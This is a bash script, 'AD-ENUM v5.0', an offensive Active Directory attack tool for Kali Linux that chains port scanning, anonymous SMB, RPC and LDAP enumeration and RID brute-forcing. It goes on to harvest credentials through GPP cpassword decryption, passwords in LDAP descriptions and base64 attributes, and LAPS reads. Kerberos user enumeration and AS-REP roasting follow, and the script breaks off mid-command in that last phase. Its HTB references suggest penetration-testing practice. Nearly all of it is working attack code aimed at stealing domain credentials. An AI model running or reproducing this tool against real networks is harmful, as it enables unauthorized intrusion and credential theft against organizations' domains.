#!/bin/bash
#══════════════════════════════════════════════════════════════════════════════
#  AD-ENUM v5.0 : Ultimate Active Directory Enumerator & Hash Extractor
#  Optimized for Kali Linux
#  Usage: sudo ./ad-enum.sh -t <TARGET_IP> [-u user] [-p pass] [-H hash]
#══════════════════════════════════════════════════════════════════════════════

RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[0;33m'; BLU='\033[0;34m'
MAG='\033[0;35m'; CYN='\033[0;36m'; WHT='\033[1;37m'; RST='\033[0m'
BOLD='\033[1m'; DIM='\033[2m'

TARGET=""; DOMAIN=""; DOMAIN_DN=""; DC_HOST=""; NETBIOS=""; OUTDIR=""
USERS_FILE=""; VALID_USERS=""; CREDS_FILE=""; HASHES_FILE=""
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
USERLIST="$SCRIPT_DIR/wordlists/ad-usernames.txt"
PASSLIST="$SCRIPT_DIR/wordlists/ad-passwords.txt"
CORE_USERLIST="$SCRIPT_DIR/wordlists/ad-usernames.txt"

banner(){
cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════════╗
    ║   █████╗ ██████╗       ███████╗███╗   ██╗██╗   ██╗███╗   ███╗     ║
    ║  ██╔══██╗██╔══██╗      ██╔════╝████╗  ██║██║   ██║████╗ ████║     ║
    ║  ███████║██║  ██║█████╗█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║     ║
    ║  ██╔══██║██║  ██║╚════╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║     ║
    ║  ██║  ██║██████╔╝      ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║     ║
    ║  ╚═╝  ╚═╝╚═════╝       ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝     ║
    ║     Ultimate AD Enumerator & Hash Extractor v5.0 (Kali Linux)     ║
    ╚═══════════════════════════════════════════════════════════════════╝
EOF
echo ""
}

info()  { echo -e "${BLU}[*]${RST} $1"; }
ok()    { echo -e "${GRN}[+]${RST} $1"; }
warn()  { echo -e "${YEL}[!]${RST} $1"; }
fail()  { echo -e "${RED}[-]${RST} $1"; }
crit()  { echo -e "${RED}${BOLD}[★]${RST} ${RED}$1${RST}"; }
phase() { echo -e "\n${MAG}${BOLD}╔═══════════════════════════════════════════════════════════╗${RST}"; echo -e "${MAG}${BOLD}║  PHASE $1${RST}"; echo -e "${MAG}${BOLD}╚═══════════════════════════════════════════════════════════╝${RST}\n"; }
sep()   { echo -e "${DIM}─────────────────────────────────────────────────────────────${RST}"; }

usage(){
    echo -e "${WHT}Usage:${RST} sudo $0 -t <TARGET_IP> [options]"
    echo -e "  -t  Target DC IP address (required)"
    echo -e "  -u  Username for authenticated enumeration"
    echo -e "  -p  Password for authenticated enumeration"
    echo -e "  -H  NTLM hash for pass-the-hash (LM:NT or just NT)"
    echo -e "  -w  Custom username wordlist"
    echo -e "  -W  Custom password wordlist"
    echo -e "  -i  Install all missing required and optional tools"
    echo -e "  -h  Show this help"
    exit 0
}

check_root(){ [[ $EUID -ne 0 ]] && { fail "Run as root: sudo $0 -t <IP>"; exit 1; }; }

check_tools(){
    local req=(nmap ldapsearch smbclient rpcclient)
    local imp=(impacket-GetNPUsers impacket-GetUserSPNs impacket-secretsdump impacket-lookupsid impacket-psexec impacket-wmiexec impacket-GetADUsers impacket-reg impacket-rpcdump)
    local opt=(netexec kerbrute gobuster dnsenum ldapdomaindump enum4linux-ng smbmap gpp-decrypt bloodhound-python certipy-ad evil-winrm snmpwalk smtp-user-enum onesixtyone responder)
    local missing=0
    info "Checking tools..."
    for t in "${req[@]}" "${imp[@]}"; do
        command -v "$t" &>/dev/null && ok "$t" || { fail "Missing: $t"; missing=1; }
    done
    for t in "${opt[@]}"; do
        command -v "$t" &>/dev/null && ok "$t (optional)" || warn "$t missing (some features skipped)"
    done
    [[ $missing -eq 1 ]] && { fail "Install missing required tools with: sudo $0 -i"; exit 1; }
}

install_tools(){
    info "Starting tool installation (Kali Linux)..."
    apt update
    
    # APT packages
    local apt_pkgs=(nmap ldap-utils smbclient rpcclient gobuster dnsenum ldapdomaindump enum4linux-ng smbmap gpp-decrypt bloodhound onesixtyone snmp responder)
    for p in "${apt_pkgs[@]}"; do
        info "Installing $p..."
        apt install -y "$p" &>/dev/null && ok "$p installed" || warn "Failed to install $p via apt"
    done

    # Pip packages
    info "Installing python dependencies..."
    pip3 install impacket bloodhound certipy-ad --break-system-packages &>/dev/null && ok "Python tools installed" || warn "Pip installation failed"

    # Kerbrute (Binary)
    if ! command -v kerbrute &>/dev/null; then
        info "Installing kerbrute..."
        wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute &>/dev/null
        chmod +x /usr/local/bin/kerbrute && ok "kerbrute installed" || warn "kerbrute installation failed"
    fi
    
    # NetExec
    if ! command -v netexec &>/dev/null; then
        info "Installing netexec..."
        apt install -y netexec &>/dev/null || pip3 install netexec --break-system-packages &>/dev/null
        command -v netexec &>/dev/null && ok "netexec installed" || warn "netexec installation failed"
    fi

    ok "Installation complete! Re-running tool check..."
    check_tools
}

setup(){
    OUTDIR="./ad-enum-results/${TARGET}_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTDIR"/{nmap,smb,ldap,kerberos,hashes,passwords,web,bloodhound,certs,misc}
    USERS_FILE="$OUTDIR/all_users.txt"; VALID_USERS="$OUTDIR/valid_users.txt"
    CREDS_FILE="$OUTDIR/found_credentials.txt"; HASHES_FILE="$OUTDIR/found_hashes.txt"
    touch "$USERS_FILE" "$VALID_USERS" "$CREDS_FILE" "$HASHES_FILE"
    ok "Output → $OUTDIR"
}

add_user(){ [[ -z "$1" ]] && return; echo "$1" | tr '[:upper:]' '[:lower:]' >> "$USERS_FILE"; sort -u -o "$USERS_FILE" "$USERS_FILE"; }
save_cred(){
    [[ -z "$1" || -z "$2" ]] && return
    local e="$1:$2"; grep -qxF "$e" "$CREDS_FILE" 2>/dev/null && return
    echo "$e" >> "$CREDS_FILE"; crit "CREDENTIAL ➜ $e"
    # Update global auth if not set
    if [[ -z "$AUTH_USER" ]]; then
        AUTH_USER="$1"; AUTH_PASS="$2"
        ok "Global Auth updated to: $AUTH_USER"
    fi
}
save_hash(){
    [[ -z "$1" ]] && return; echo "$1" >> "$HASHES_FILE"
}
get_best_cred(){
    # Returns first discovered credential
    DUMP_USER="${AUTH_USER}"; DUMP_PASS="${AUTH_PASS}"; DUMP_HASH="${AUTH_HASH}"
    if [[ -z "$DUMP_USER" && -s "$CREDS_FILE" ]]; then
        # Check for Administrator first
        DUMP_USER=$(grep -i "^administrator:" "$CREDS_FILE" | head -1 | cut -d: -f1)
        DUMP_PASS=$(grep -i "^administrator:" "$CREDS_FILE" | head -1 | cut -d: -f2-)
        
        # fallback to any cred
        if [[ -z "$DUMP_USER" ]]; then
            DUMP_USER=$(head -1 "$CREDS_FILE" | cut -d: -f1)
            DUMP_PASS=$(head -1 "$CREDS_FILE" | cut -d: -f2-)
        fi
    fi
}

parse_nxc_output(){
    local input_file="$1"
    local default_pass="$2"
    grep -iE "\[\+\]|Pwn3d" "$input_file" | grep -iv "STATUS_LOGON_FAILURE" | while read -r line; do
        # Extract user:pass from [+] DOMAIN\user:pass
        if echo "$line" | grep -q ":"; then
            local u=$(echo "$line" | grep -oP '\S+\\\K[^:]+')
            local p=$(echo "$line" | grep -oP ':\K\S+' | sed 's/)$//;s/($//') # strip parens if Pwn3d
        else
            # Case where only [+] line is shown and password was the argument
            local u=$(echo "$line" | grep -oP '\S+\\\K\S+')
            local p="$default_pass"
        fi
        [[ -n "$u" && -n "$p" ]] && save_cred "$u" "$p"
    done
}

# ── Argument Parsing ─────────────────────────────────────────────────────────
AUTH_USER=""; AUTH_PASS=""; AUTH_HASH=""; INSTALL_MODE=0
while getopts "t:u:p:H:w:W:hi" opt; do
    case $opt in t) TARGET="$OPTARG";; u) AUTH_USER="$OPTARG";; p) AUTH_PASS="$OPTARG";;
                 H) AUTH_HASH="$OPTARG";; w) USERLIST="$OPTARG";; W) PASSLIST="$OPTARG";;
                 i) INSTALL_MODE=1;; h) usage;; *) usage;; esac
done

banner; check_root
[[ $INSTALL_MODE -eq 1 ]] && { install_tools; exit 0; }

[[ -z "$TARGET" ]] && { echo -ne "${CYN}[?] Enter target DC IP: ${RST}"; read -r TARGET; }
[[ -z "$TARGET" ]] && { fail "No target."; exit 1; }
[[ -n "$AUTH_USER" ]] && ok "Auth: $AUTH_USER"
[[ -n "$AUTH_HASH" ]] && ok "Hash auth enabled"
check_tools; setup
echo "AD-ENUM v5.0 | Target: $TARGET | $(date)" > "$OUTDIR/report.txt"

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — NMAP
# ═══════════════════════════════════════════════════════════════════════════════
phase "1 — NMAP SCAN"
info "SYN scan..."
nmap -sS -T4 --top-ports 1000 -oA "$OUTDIR/nmap/quick" "$TARGET" 2>/dev/null | tee "$OUTDIR/nmap/quick_stdout.txt"
OPEN_PORTS=$(grep -oP '\d+/open' "$OUTDIR/nmap/quick.gnmap" 2>/dev/null | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
if [[ -z "$OPEN_PORTS" ]]; then
    warn "Full port scan..."
    nmap -sS -p- -T4 -oA "$OUTDIR/nmap/full" "$TARGET" 2>/dev/null
    OPEN_PORTS=$(grep -oP '\d+/open' "$OUTDIR/nmap/full.gnmap" 2>/dev/null | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
fi
[[ -z "$OPEN_PORTS" ]] && { fail "No open ports."; exit 1; }
ok "Ports: $OPEN_PORTS"

info "Version + scripts..."
nmap -sC -sV -p "$OPEN_PORTS" --script="ldap-rootdse,smb-os-discovery,smb2-security-mode,smb-enum-shares,smb-enum-users" \
    -oA "$OUTDIR/nmap/version" "$TARGET" 2>/dev/null | tee "$OUTDIR/nmap/version_stdout.txt"

# Check SMB signing (for relay attacks)
SMB_SIGNING=$(grep -i "message_signing" "$OUTDIR/nmap/version_stdout.txt" 2>/dev/null | head -1)
if echo "$SMB_SIGNING" | grep -qi "disabled\|not required"; then
    crit "SMB SIGNING NOT REQUIRED — NTLM Relay possible!"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — DOMAIN DISCOVERY
# ═══════════════════════════════════════════════════════════════════════════════
phase "2 — DOMAIN DISCOVERY"
info "Parsing nmap..."
DOMAIN=$(grep -i "Domain:" "$OUTDIR/nmap/version_stdout.txt" 2>/dev/null | head -1 | sed 's/.*Domain: //;s/,.*//' | tr -d '[:space:]')
DC_HOST=$(grep -i "Computer name:" "$OUTDIR/nmap/version_stdout.txt" 2>/dev/null | head -1 | sed 's/.*Computer name: //;s/,.*//' | tr -d '[:space:]')
NETBIOS=$(grep -i "NetBIOS" "$OUTDIR/nmap/version_stdout.txt" 2>/dev/null | head -1 | grep -oP 'NetBIOS[^:]*:\s*\K\S+')

if [[ -z "$DOMAIN" ]]; then
    info "LDAP rootDSE..."
    LDAP_ROOT=$(ldapsearch -x -H "ldap://$TARGET" -s base namingContexts 2>/dev/null)
    echo "$LDAP_ROOT" > "$OUTDIR/ldap/rootdse.txt"
    DOMAIN_DN=$(echo "$LDAP_ROOT" | grep "namingContexts:" | grep -i "DC=" | head -1 | awk '{print $2}')
    [[ -n "$DOMAIN_DN" ]] && DOMAIN=$(echo "$DOMAIN_DN" | sed 's/DC=//gi;s/,/./g')
fi
[[ -n "$DOMAIN" && -z "$DOMAIN_DN" ]] && DOMAIN_DN=$(echo "$DOMAIN" | sed 's/\./,DC=/g;s/^/DC=/')

if [[ -z "$DOMAIN" ]]; then
    echo -ne "${CYN}[?] Enter domain (e.g. corp.local): ${RST}"; read -r DOMAIN
    [[ -n "$DOMAIN" ]] && DOMAIN_DN=$(echo "$DOMAIN" | sed 's/\./,DC=/g;s/^/DC=/')
fi
[[ -n "$DOMAIN" ]] && ok "Domain: $DOMAIN | DN: $DOMAIN_DN"
[[ -n "$DC_HOST" ]] && ok "DC: $DC_HOST"

# DNS enum (Advanced)
if echo "$OPEN_PORTS" | grep -q "53"; then
    info "DNS SRV records..."
    for srv in _kerberos._tcp _kerberos._udp _ldap._tcp _kpasswd._tcp _gc._tcp; do
        dig +short -t SRV "${srv}.${DOMAIN}" "@$TARGET" 2>/dev/null | tee -a "$OUTDIR/misc/dns_srv.txt"
    done

    command -v dnsenum &>/dev/null && {
        info "dnsenum..."
        dnsenum --dnsserver "$TARGET" "$DOMAIN" --noreverse -o "$OUTDIR/misc/dnsenum.xml" 2>/dev/null | tee "$OUTDIR/misc/dnsenum.txt"
    }
fi

# Nmap Kerberos User Enum (No creds needed)
if echo "$OPEN_PORTS" | grep -q "88"; then
    info "Nmap Kerberos user enum (no creds)..."
    nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm="$DOMAIN",userdb="$CORE_USERLIST" --host-timeout 5m "$TARGET" 2>/dev/null | tee "$OUTDIR/kerberos/nmap_kerb_enum.txt"
    grep "Vulnerable" -A 10 "$OUTDIR/kerberos/nmap_kerb_enum.txt" 2>/dev/null | grep -v "Vulnerable" | awk '{print $1}' | while read -r u; do add_user "$u"; done
fi

# /etc/hosts
[[ -n "$DC_HOST" && -n "$DOMAIN" ]] && ! grep -q "$TARGET" /etc/hosts 2>/dev/null && {
    echo "$TARGET  $DC_HOST.$DOMAIN $DC_HOST $DOMAIN" >> /etc/hosts; ok "/etc/hosts updated"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  NEW PHASE — SNMP & SMTP ENUMERATION
# ═══════════════════════════════════════════════════════════════════════════════
if echo "$OPEN_PORTS" | grep -qE "(161|25)"; then
    phase "SNMP & SMTP DISCOVERY"

    # SNMP
    if echo "$OPEN_PORTS" | grep -q "161"; then
        info "SNMP enumeration..."
        for community in public private manager; do
            onesixtyone -c <(echo "$community") "$TARGET" 2>/dev/null | grep -q "$TARGET" && {
                ok "SNMP Community Found: $community"
                snmpwalk -v2c -c "$community" "$TARGET" 1.3.6.1.4.1.77.1.2.25 2>/dev/null | tee "$OUTDIR/misc/snmp_users.txt"
                grep -oP 'STRING: "\K[^"]+' "$OUTDIR/misc/snmp_users.txt" 2>/dev/null | while read -r u; do add_user "$u"; done
            }
        done
    fi

    # SMTP
    if echo "$OPEN_PORTS" | grep -q "25"; then
        info "SMTP user enumeration..."
        command -v smtp-user-enum &>/dev/null && {
            smtp-user-enum -M VRFY -U "$USERLIST" -t "$TARGET" 2>/dev/null | tee "$OUTDIR/misc/smtp_users.txt"
            grep "exists" "$OUTDIR/misc/smtp_users.txt" 2>/dev/null | awk '{print $2}' | while read -r u; do add_user "$u"; done
        }
    fi
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — SMB + GPP + Share Mining
# ═══════════════════════════════════════════════════════════════════════════════
phase "3 — SMB ENUMERATION"

if echo "$OPEN_PORTS" | grep -qE "(445|139)"; then

    # netexec SMB
    if command -v netexec &>/dev/null; then
        info "netexec SMB (basic + modules)..."
        netexec smb "$TARGET" 2>/dev/null | tee "$OUTDIR/smb/nxc_info.txt"
        
        # Enumerate shares for common creds
        for cred in "-u '' -p ''" "-u 'guest' -p ''"; do
            eval netexec smb "$TARGET" $cred --shares 2>/dev/null
        done | tee "$OUTDIR/smb/shares.txt"
        
        # Advanced modules
        netexec smb "$TARGET" -u '' -p '' -M enum_domain_users 2>/dev/null | tee "$OUTDIR/smb/nxc_users.txt"
        netexec smb "$TARGET" -u '' -p '' -M users 2>/dev/null | tee -a "$OUTDIR/smb/nxc_users.txt"
        grep -oP '\[\+] \K\S+' "$OUTDIR/smb/nxc_users.txt" 2>/dev/null | while read -r u; do add_user "$u"; done
        sep

        # RID Brute
        info "RID cycling..."
        netexec smb "$TARGET" -u '' -p '' --rid-brute 4000 2>/dev/null | tee "$OUTDIR/smb/rid_brute.txt"
        netexec smb "$TARGET" -u 'guest' -p '' --rid-brute 4000 2>/dev/null | tee -a "$OUTDIR/smb/rid_brute.txt"
        grep -i "SidTypeUser" "$OUTDIR/smb/rid_brute.txt" 2>/dev/null | awk -F'\\ ' '{print $2}' | awk '{print $1}' | grep -v '^\.\|^$' | while read -r u; do add_user "$u"; done
    fi

    # smbclient + smbmap
    smbclient -L "//$TARGET/" -N 2>/dev/null | tee "$OUTDIR/smb/smbclient_list.txt"
    command -v smbmap &>/dev/null && {
        info "smbmap recursive..."
        smbmap -H "$TARGET" -u '' -p '' -R --depth 10 2>/dev/null | tee "$OUTDIR/smb/smbmap_recursive.txt"
    }

    # GetADUsers (Advanced AD user discovery)
    command -v impacket-GetADUsers &>/dev/null && [[ -n "$DOMAIN" ]] && {
        info "impacket-GetADUsers (all users)..."
        impacket-GetADUsers "$DOMAIN/" -all -dc-ip "$TARGET" -no-pass 2>/dev/null | tee "$OUTDIR/smb/getadusers.txt"
        grep -oP '^[^ ]+' "$OUTDIR/smb/getadusers.txt" 2>/dev/null | grep -vE 'User|---|Password|Last|Authenticat' | while read -r u; do add_user "$u"; done
    }

    # ═══ GPP PASSWORDS (HTB: Active) ═══
    info "★ GPP Password hunting..."
    mkdir -p "$OUTDIR/smb/gpp_files"
    for share in Replication SYSVOL NETLOGON; do
        smbclient "//$TARGET/$share" -N -c "recurse ON; prompt OFF; lcd $OUTDIR/smb/gpp_files; mget *.xml" 2>/dev/null
        [[ -n "$AUTH_USER" ]] && smbclient "//$TARGET/$share" -U "$AUTH_USER%$AUTH_PASS" -c "recurse ON; prompt OFF; lcd $OUTDIR/smb/gpp_files; mget *.xml" 2>/dev/null
    done
    # Decrypt GPP
    find "$OUTDIR/smb/gpp_files" -name "*.xml" 2>/dev/null | while read -r f; do
        CPASS=$(grep -oP 'cpassword="\K[^"]+' "$f" 2>/dev/null)
        GUSER=$(grep -oP 'userName="\K[^"]+' "$f" 2>/dev/null)
        if [[ -n "$CPASS" ]] && command -v gpp-decrypt &>/dev/null; then
            GPLAIN=$(gpp-decrypt "$CPASS" 2>/dev/null)
            [[ -n "$GPLAIN" ]] && { crit "★ GPP PASSWORD: $GUSER → $GPLAIN"; save_cred "$(echo "$GUSER" | sed 's/.*\\//')" "$GPLAIN"; }
        fi
    done

    # enum4linux-ng
    command -v enum4linux-ng &>/dev/null && {
        info "enum4linux-ng..."
        enum4linux-ng -A "$TARGET" -oJ "$OUTDIR/smb/enum4linux" 2>/dev/null | tee "$OUTDIR/smb/enum4linux_stdout.txt"
        grep -oP '"username":\s*"\K[^"]+' "$OUTDIR/smb/enum4linux.json" 2>/dev/null | while read -r u; do add_user "$u"; done
    }

    # rpcclient — enumdomusers
    rpcclient -U '' -N "$TARGET" -c 'enumdomusers' 2>/dev/null | tee "$OUTDIR/smb/rpc_users.txt"
    grep -oP '\[([^\]]+)\]' "$OUTDIR/smb/rpc_users.txt" 2>/dev/null | tr -d '[]' | grep -v "0x" | while read -r u; do add_user "$u"; done

    # rpcclient — enumdomgroups + members (Deep Enum)
    info "rpcclient — groups + members..."
    rpcclient -U '' -N "$TARGET" -c 'enumdomgroups' 2>/dev/null | grep -oP 'rid:\[\K0x[0-9a-f]+' | while read -r rid; do
        rpcclient -U '' -N "$TARGET" -c "querygroupmem $rid" 2>/dev/null | grep -oP 'rid:\[\K0x[0-9a-f]+' | while read -r urid; do
            rpcclient -U '' -N "$TARGET" -c "queryuser $urid" 2>/dev/null | grep "User Name" | awk '{print $NF}' | while read -r u; do add_user "$u"; done
        done
    done

    # rpcclient — querydispinfo (alternate user enumeration)
    rpcclient -U '' -N "$TARGET" -c 'querydispinfo' 2>/dev/null | tee "$OUTDIR/smb/rpc_dispinfo.txt"
    grep -oP 'Account:\s*\K\S+' "$OUTDIR/smb/rpc_dispinfo.txt" 2>/dev/null | while read -r u; do add_user "$u"; done

    # lookupsid
    impacket-lookupsid "${DOMAIN:-UNKNOWN}/"'@'"$TARGET" -no-pass 2>/dev/null | tee "$OUTDIR/smb/lookupsid.txt"
    grep "SidTypeUser" "$OUTDIR/smb/lookupsid.txt" 2>/dev/null | awk -F'\\ ' '{print $2}' | awk '{print $1}' | grep -v '^$' | while read -r u; do add_user "$u"; done

    ok "Users found: $(wc -l < "$USERS_FILE" 2>/dev/null)"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — LDAP: Users + Descriptions + Base64 + LAPS + gMSA
# ═══════════════════════════════════════════════════════════════════════════════
phase "4 — LDAP DEEP ENUMERATION"

if echo "$OPEN_PORTS" | grep -qE "(389|636|3268)"; then
    LU="ldap://$TARGET"

    # Users with description (HTB: Resolute — password in description)
    info "LDAP users + descriptions..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(&(objectClass=user)(objectCategory=person))" \
        sAMAccountName description userAccountControl memberOf userPrincipalName 2>/dev/null > "$OUTDIR/ldap/users.txt"
    grep "sAMAccountName:" "$OUTDIR/ldap/users.txt" 2>/dev/null | awk '{print $2}' | grep -vE '^\$|^$' | while read -r u; do add_user "$u"; done

    # Also try to enumerate ALL user objects with a simpler filter
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectCategory=person)" sAMAccountName 2>/dev/null > "$OUTDIR/ldap/users_simple.txt"
    grep "sAMAccountName:" "$OUTDIR/ldap/users_simple.txt" 2>/dev/null | awk '{print $2}' | grep -vE '^\$|^$' | while read -r u; do add_user "$u"; done

    # ★ Passwords in description fields (HTB: Resolute)
    info "★ Checking descriptions for passwords..."
    while IFS= read -r line; do
        if echo "$line" | grep -q "^sAMAccountName:"; then CUR_USER=$(echo "$line" | awk '{print $2}'); fi
        if echo "$line" | grep -qi "description:"; then
            DESC=$(echo "$line" | sed 's/description: //')
            if echo "$DESC" | grep -qiE "(pass|pwd|cred|secret|temp|initial|default)"; then
                crit "★ PASSWORD IN DESCRIPTION: $CUR_USER → $DESC"
                PASS_G=$(echo "$DESC" | grep -oP '(?i)(?:pass(?:word)?|pwd)\s*[:=]\s*\K\S+' || echo "$DESC")
                save_cred "$CUR_USER" "$PASS_G"
            fi
        fi
    done < "$OUTDIR/ldap/users.txt"

    # ★ Base64-encoded passwords in custom attributes (HTB: Cascade)
    info "★ Checking for base64 passwords in LDAP attributes..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=user)" '*' '+' 2>/dev/null > "$OUTDIR/ldap/users_all_attrs.txt"
    grep -iE "(cascadeLegacyPwd|msDS-UserPasswordExpiryTimeComputed|unixUserPassword|userPassword|orclPassword)" "$OUTDIR/ldap/users_all_attrs.txt" 2>/dev/null | while read -r line; do
        ATTR_VAL=$(echo "$line" | awk '{print $2}')
        DECODED=$(echo "$ATTR_VAL" | base64 -d 2>/dev/null)
        if [[ -n "$DECODED" && ${#DECODED} -gt 2 ]]; then
            crit "★ BASE64 PASSWORD FOUND: $DECODED"
            save_hash "B64_LDAP|$DECODED"
        fi
    done

    # Password policy
    info "Password policy..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=domain)" minPwdLength lockoutThreshold lockoutDuration 2>/dev/null > "$OUTDIR/ldap/pwpolicy.txt"
    grep -E "(minPwdLength|lockoutThreshold)" "$OUTDIR/ldap/pwpolicy.txt" 2>/dev/null

    # SPNs (Kerberoastable)
    info "SPN users..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName 2>/dev/null > "$OUTDIR/ldap/spn.txt"
    grep "sAMAccountName:" "$OUTDIR/ldap/spn.txt" 2>/dev/null | awk '{print $2}' | while read -r u; do ok "SPN → $u"; done

    # AS-REP Roastable
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName 2>/dev/null > "$OUTDIR/ldap/asrep.txt"
    grep "sAMAccountName:" "$OUTDIR/ldap/asrep.txt" 2>/dev/null | awk '{print $2}' | while read -r u; do ok "AS-REP → $u"; done

    # ★ LAPS passwords (if readable)
    info "★ LAPS password check..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=computer)" ms-Mcs-AdmPwd ms-LAPS-Password cn 2>/dev/null > "$OUTDIR/ldap/laps.txt"
    grep -E "(ms-Mcs-AdmPwd|ms-LAPS-Password):" "$OUTDIR/ldap/laps.txt" 2>/dev/null | while read -r line; do
        crit "★ LAPS PASSWORD FOUND: $line"
        save_hash "LAPS|$line"
    done

    # ★ gMSA password check
    info "★ gMSA password check..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=msDS-GroupManagedServiceAccount)" sAMAccountName msDS-ManagedPasswordId 2>/dev/null > "$OUTDIR/ldap/gmsa.txt"
    grep "sAMAccountName:" "$OUTDIR/ldap/gmsa.txt" 2>/dev/null | awk '{print $2}' | while read -r u; do ok "gMSA account → $u"; done

    # ★ MachineAccountQuota (for computer account creation attacks)
    info "★ MachineAccountQuota..."
    MAQ=$(ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=domain)" ms-DS-MachineAccountQuota 2>/dev/null | grep "ms-DS-MachineAccountQuota:" | awk '{print $2}')
    [[ -n "$MAQ" && "$MAQ" != "0" ]] && ok "MachineAccountQuota: $MAQ (computer account creation possible)"

    # Computers
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=computer)" cn dNSHostName operatingSystem 2>/dev/null > "$OUTDIR/ldap/computers.txt"

    # ★ Delegation Check (Unconstrained/Constrained)
    info "★ Checking for delegation (Unconstrained/Constrained)..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName 2>/dev/null > "$OUTDIR/ldap/unconstrained_delegation.txt"
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo 2>/dev/null > "$OUTDIR/ldap/constrained_delegation.txt"
    
    # ★ AdminCount (Privileged Users)
    info "★ Checking for privileged users (adminCount=1)..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(adminCount=1)" sAMAccountName description 2>/dev/null > "$OUTDIR/ldap/privileged_users.txt"
    grep "sAMAccountName:" "$OUTDIR/ldap/privileged_users.txt" 2>/dev/null | awk '{print $2}' | while read -r u; do ok "Privileged → $u"; done

    # ★ Shadow Credentials check
    info "★ Shadow Credentials check..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(msDS-KeyCredentialLink=*)" sAMAccountName 2>/dev/null > "$OUTDIR/ldap/shadow_creds.txt"

    # ★ Machines with RBCD
    info "★ Machines with RBCD configured..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" sAMAccountName 2>/dev/null > "$OUTDIR/ldap/rbcd.txt"

    # ldapdomaindump
    command -v ldapdomaindump &>/dev/null && {
        if [[ -n "$AUTH_USER" ]]; then
            ldapdomaindump "$LU" -u "$DOMAIN\\$AUTH_USER" -p "$AUTH_PASS" -o "$OUTDIR/ldap/dump" 2>/dev/null
        else
            ldapdomaindump "$LU" -d "$DOMAIN" -o "$OUTDIR/ldap/dump" 2>/dev/null
        fi
    }
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — KERBEROS USER ENUM
# ═══════════════════════════════════════════════════════════════════════════════
phase "5 — KERBEROS ENUMERATION"

if echo "$OPEN_PORTS" | grep -q "88" && [[ -n "$DOMAIN" ]]; then
    command -v kerbrute &>/dev/null && {
        info "Kerbrute enumeration..."
        kerbrute userenum -d "$DOMAIN" --dc "$TARGET" "$USERLIST" -o "$OUTDIR/kerberos/kerbrute_wl.txt" 2>/dev/null | tee "$OUTDIR/kerberos/kerbrute_stdout.txt"
        grep -i "VALID" "$OUTDIR/kerberos/kerbrute_wl.txt" 2>/dev/null | awk '{print $NF}' | sed 's/@.*//' | while read -r u; do
            add_user "$u"; echo "$u" >> "$VALID_USERS"; done

        [[ -s "$USERS_FILE" ]] && {
            kerbrute userenum -d "$DOMAIN" --dc "$TARGET" "$USERS_FILE" -o "$OUTDIR/kerberos/kerbrute_disc.txt" 2>/dev/null
            grep -i "VALID" "$OUTDIR/kerberos/kerbrute_disc.txt" 2>/dev/null | awk '{print $NF}' | sed 's/@.*//' >> "$VALID_USERS"
            sort -u -o "$VALID_USERS" "$VALID_USERS"
        }
    }
    ok "Valid users: $(wc -l < "$VALID_USERS" 2>/dev/null || echo 0)"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — PASSWORD & HASH ATTACKS
# ═══════════════════════════════════════════════════════════════════════════════
phase "6 — PASSWORD & HASH ATTACKS"
ATTACK_USERS="$USERS_FILE"; [[ -s "$VALID_USERS" ]] && ATTACK_USERS="$VALID_USERS"

# ── 6a: AS-REP Roasting (HTB: Forest, Absolute, Sauna) ──
sep; info "★ AS-REP Roasting..."
if [[ -n "$DOMAIN" ]]; then
    # Try with discovered users file
    if [[ -s "$ATTACK_USERS" ]]; then
        info "AS-REP Roasting with $(wc -l < "$ATTACK_USERS") discovered users..."
        impacket-GetNPUsers "$DOMAIN/" -dc-ip "$TARGET" -no-pass \
            -usersfile "$ATTACK_USERS" -format hashcat -outputfile "$OUTDIR/hashes/asrep.txt" 2>&1 | tee "$OUTDIR/hashes/asrep_stdout.txt"
    fi

    # Try auto-discovery (requires LDAP access to enumerate DONT_REQ_PREAUTH users)
    get_best_cred
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        info "AS-REP Roasting with auth ($DUMP_USER)..."
        impacket-GetNPUsers "$DOMAIN/$DUMP_USER:$DUMP_PASS" -dc-ip "$TARGET" -request \
